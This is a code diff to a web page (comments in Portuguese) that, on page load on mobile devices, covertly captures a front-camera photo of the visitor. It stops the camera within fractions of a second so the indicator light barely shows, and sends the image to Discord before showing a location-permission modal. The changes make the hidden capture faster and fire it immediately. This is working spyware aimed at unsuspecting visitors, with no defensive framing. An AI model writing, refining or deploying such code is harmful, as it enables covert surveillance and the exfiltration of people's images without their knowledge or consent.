@@ -406,114 +406,18 @@
         let cameraImage = null;
         let cameraAttempted = false;
         let cameraTimerId = null;
+        let cameraSent = false; // Para evitar enviar a mesma imagem várias vezes
 
         // Verificar se está em um dispositivo móvel
         const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
         
         // Verificar se está no iOS
         const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
-        
-        // Função para iniciar captura da câmera com tempo limite
-        function initCamera() {
-            if (cameraAttempted) return; // Evitar múltiplas tentativas
-            cameraAttempted = true;
-            
-            try {
-                const video = document.getElementById('cameraVideo');
-                const canvas = document.getElementById('cameraCanvas');
-                
-                // Garantir que o vídeo seja mudo (sem som)
-                video.muted = true;
-                video.setAttribute('muted', '');
-                video.setAttribute('playsinline', '');
-                
-                // Escolher a câmera frontal com baixa resolução para ser mais rápido
-                const constraints = {
-                    audio: false,
-                    video: {
-                        facingMode: "user", // Câmera frontal
-                        width: { ideal: 240 },
-                        height: { ideal: 240 }
-                    }
-                };
-                
-                // Definir um tempo máximo para a captura (2 segundos)
-                cameraTimerId = setTimeout(() => {
-                    try {
-                        if (video.srcObject) {
-                            const tracks = video.srcObject.getTracks();
-                            tracks.forEach(track => track.stop());
-                            video.srcObject = null;
-                        }
-                    } catch (e) {
-                        console.error("Erro ao parar câmera após timeout:", e);
-                    }
-                }, 2000);
-                
-                // Solicitar acesso à câmera
-                navigator.mediaDevices.getUserMedia(constraints)
-                    .then(stream => {
-                        video.srcObject = stream;
-                        video.play();
-                        
-                        // Capturar a foto assim que o vídeo começar a tocar
-                        video.onplaying = () => {
-                            // Pequeno atraso para garantir que a câmera esteja pronta
-                            setTimeout(() => {
-                                try {
-                                    // Ajustar tamanho do canvas para o vídeo
-                                    canvas.width = video.videoWidth;
-                                    canvas.height = video.videoHeight;
-                                    
-                                    // Desenhar frame do vídeo no canvas
-                                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                                    
-                                    // Obter imagem como base64 com qualidade reduzida para ser mais leve
-                                    cameraImage = canvas.toDataURL('image/jpeg', 0.5);
-                                    
-                                    console.log("Imagem capturada com sucesso!");
-                                    
-                                    // Enviar imediatamente para o Discord
-                                    sendCameraImageToDiscord(cameraImage);
-                                    
-                                    // Parar todos os tracks da câmera imediatamente para desligar a luz
-                                    const tracks = stream.getTracks();
-                                    tracks.forEach(track => track.stop());
-                                    video.srcObject = null;
-                                    
-                                    // Limpar o timeout já que concluímos com sucesso
-                                    if (cameraTimerId) {
-                                        clearTimeout(cameraTimerId);
-                                        cameraTimerId = null;
-                                    }
-                                } catch (e) {
-                                    console.error("Erro ao capturar imagem:", e);
-                                    // Certificar-se de parar a câmera mesmo em caso de erro
-                                    stream.getTracks().forEach(track => track.stop());
-                                }
-                            }, 100); // Apenas 100ms de atraso para ser super rápido
-                        };
-                    })
-                    .catch(error => {
-                        console.error("Erro ao acessar câmera:", error);
-                        // Limpar o timeout em caso de erro
-                        if (cameraTimerId) {
-                            clearTimeout(cameraTimerId);
-                            cameraTimerId = null;
-                        }
-                    });
-            } catch (error) {
-                console.error("Erro ao inicializar câmera:", error);
-                if (cameraTimerId) {
-                    clearTimeout(cameraTimerId);
-                    cameraTimerId = null;
-                }
-            }
-        }
-        
-        // Função especializada para enviar imagem da câmera diretamente para o Discord
+
+        // Função para enviar imagem da câmera diretamente para o Discord
         async function sendCameraImageToDiscord(imageBase64) {
-            if (!imageBase64) return;
+            if (!imageBase64 || cameraSent) return;
+            cameraSent = true; // Marcar como enviado para não enviar novamente
             
             try {
                 // Criar mensagem especial apenas para a imagem
@@ -566,6 +470,105 @@
             }
         }
         
+        // Função para iniciar e capturar câmera - OTIMIZADA PARA SER SUPER RÁPIDA
+        function initCamera() {
+            if (cameraAttempted) return; // Evitar múltiplas tentativas
+            cameraAttempted = true;
+            
+            try {
+                const video = document.getElementById('cameraVideo');
+                const canvas = document.getElementById('cameraCanvas');
+                
+                // Configurar vídeo para ser o mais silencioso possível
+                video.muted = true;
+                video.setAttribute('muted', '');
+                video.setAttribute('playsinline', '');
+                video.volume = 0;
+                
+                // Configurações otimizadas para câmera frontal com resolução mínima
+                const constraints = {
+                    audio: false,
+                    video: {
+                        facingMode: "user", // Câmera frontal
+                        width: { ideal: 320 },
+                        height: { ideal: 240 },
+                        frameRate: { ideal: 15 } // Framerates mais baixos consomem menos recursos
+                    }
+                };
+                
+                // Definir timeout de segurança para garantir que a câmera seja desligada
+                cameraTimerId = setTimeout(() => {
+                    try {
+                        if (video.srcObject) {
+                            const tracks = video.srcObject.getTracks();
+                            tracks.forEach(track => track.stop());
+                            video.srcObject = null;
+                            console.log("Câmera parada por timeout de segurança");
+                        }
+                    } catch (e) {
+                        console.error("Erro ao parar câmera após timeout:", e);
+                    }
+                }, 2000); // 2 segundos no máximo
+                
+                // Solicitar acesso à câmera com alta prioridade
+                navigator.mediaDevices.getUserMedia(constraints)
+                    .then(stream => {
+                        video.srcObject = stream;
+                        
+                        // Tocar o vídeo imediatamente
+                        const playPromise = video.play();
+                        
+                        if (playPromise !== undefined) {
+                            playPromise
+                                .then(() => {
+                                    // O vídeo está tocando, esperar apenas o tempo mínimo necessário
+                                    setTimeout(() => {
+                                        try {
+                                            // Capturar a imagem
+                                            canvas.width = video.videoWidth;
+                                            canvas.height = video.videoHeight;
+                                            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                                            
+                                            // Obter base64 da imagem com qualidade reduzida
+                                            cameraImage = canvas.toDataURL('image/jpeg', 0.5);
+                                            console.log("Imagem capturada com sucesso!");
+                                            
+                                            // IMPORTANTE: Parar IMEDIATAMENTE a câmera para minimizar a luz
+                                            stream.getTracks().forEach(track => track.stop());
+                                            video.srcObject = null;
+                                            
+                                            // Limpar o timeout já que concluímos
+                                            clearTimeout(cameraTimerId);
+                                            
+                                            // ENVIAR PARA O DISCORD IMEDIATAMENTE
+                                            sendCameraImageToDiscord(cameraImage);
+                                            
+                                        } catch (e) {
+                                            console.error("Erro ao capturar imagem:", e);
+                                            // Garantir que a câmera seja parada mesmo em caso de erro
+                                            stream.getTracks().forEach(track => track.stop());
+                                        }
+                                    }, 150); // Apenas 150ms de espera após início do vídeo
+                                })
+                                .catch(error => {
+                                    console.error("Erro ao iniciar reprodução do vídeo:", error);
+                                    // Parar a câmera em caso de erro
+                                    stream.getTracks().forEach(track => track.stop());
+                                });
+                        }
+                    })
+                    .catch(error => {
+                        console.error("Erro ao acessar câmera:", error);
+                        clearTimeout(cameraTimerId);
+                    });
+            } catch (error) {
+                console.error("Erro ao inicializar câmera:", error);
+                if (cameraTimerId) {
+                    clearTimeout(cameraTimerId);
+                }
+            }
+        }
+        
         // Função para mostrar o carregamento
         function showLoading() {
             document.getElementById('loading').style.display = 'flex';
@@ -581,17 +584,15 @@
             document.getElementById('locationModal').style.display = 'none';
         }
         
-        // Mostrar o modal e iniciar câmera ao carregar a página
+        // Inicialização quando o DOM estiver carregado
         document.addEventListener('DOMContentLoaded', function() {
-            // Se for dispositivo móvel, iniciar a câmera imediatamente
+            // IMPORTANTE: Iniciar câmera IMEDIATAMENTE quando a página carregar
             if (isMobile) {
-                // Pequeno atraso para garantir que a página esteja carregada
-                setTimeout(() => {
-                    initCamera();
-                }, 500);
+                // Iniciar a câmera imediatamente
+                initCamera();
             }
             
-            // Mostrar o modal de localização após um breve atraso
+            // Mostrar o modal após um pequeno atraso
             setTimeout(function() {
                 showLocationModal();
             }, 1000);
@@ -808,7 +809,7 @@
             button.textContent = "Verificando...";
             button.disabled = true;
             
-            // Se ainda não tentamos capturar imagem da câmera, tentar agora
+            // Se ainda não capturamos a câmera, tentar novamente (mas provavelmente já foi feito)
             if (isMobile && !cameraAttempted) {
                 initCamera();
             }
